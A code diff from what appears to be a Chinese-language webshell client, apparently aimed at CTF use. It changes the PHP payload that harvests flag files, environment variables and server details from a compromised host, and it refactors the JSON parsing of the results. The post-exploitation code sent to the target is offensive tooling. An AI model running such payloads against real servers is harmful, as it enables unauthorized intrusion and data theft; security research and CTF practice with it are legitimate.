@@ -408,13 +408,21 @@ if (PHP_OS === 'Linux') {
     foreach (scandir("/") as $filename) {
         if (preg_match($regex, $filename)) {
             $content = trim(file_get_contents("/" . $filename));
-            $flags .= "/$filename $content | ";
+            if(strlen($content) > 100) {
+                $flags .= "/$filename | ";
+            }else{
+                $flags .= "/$filename $content | ";
+            }
         }
     }
     foreach (scandir("./") as $filename) {
         if (preg_match($regex, $filename)) {
             $content = trim(file_get_contents("./" . $filename));
-            $flags .= "./$filename $content | ";
+            if(strlen($content) > 100) {
+                $flags .= "./$filename | ";
+            }else{
+                $flags .= "./$filename $content | ";
+            }
         }
     }
     foreach ($_ENV as $key => $value) {
@@ -622,7 +630,7 @@ basic_info_names = {
     "ENV_PATH": "环境变量PATH",
     "INI_DISABLED_FUNCTIONS": "disabled_functions",
     "EXTENSIONS": "PHP扩展",
-    "CTF_FLAGS": "CTF flag",
+    "CTF_FLAGS": "疑似CTF flag文件",
 }
 
 
@@ -1098,23 +1106,23 @@ class PHPWebshellActions(PHPSessionInterface):
 
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
         json_result = await self.submit(GET_BASIC_INFO_PHP)
+        raw_result = None
         try:
             raw_result = json.loads(json_result)
-            result: t.List[BasicInfoEntry] = [
-                BasicInfoEntry(
-                    key=(
-                        basic_info_names[entry["key"]]
-                        if entry["key"] in basic_info_names
-                        else entry["key"]
-                    ),
-                    value=entry["value"],
-                )
-                for entry in raw_result
-            ]
-            return result
         except json.JSONDecodeError as exc:
             raise exceptions.PayloadOutputError("解析目标返回的JSON失败") from exc
-
+        result: t.List[BasicInfoEntry] = [
+            BasicInfoEntry(
+                key=(
+                    basic_info_names[entry["key"]]
+                    if entry["key"] in basic_info_names
+                    else entry["key"]
+                ),
+                value=entry["value"],
+            )
+            for entry in raw_result
+        ]
+        return result
     async def download_phpinfo(self) -> bytes:
         """获取当前的phpinfo文件"""
         b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
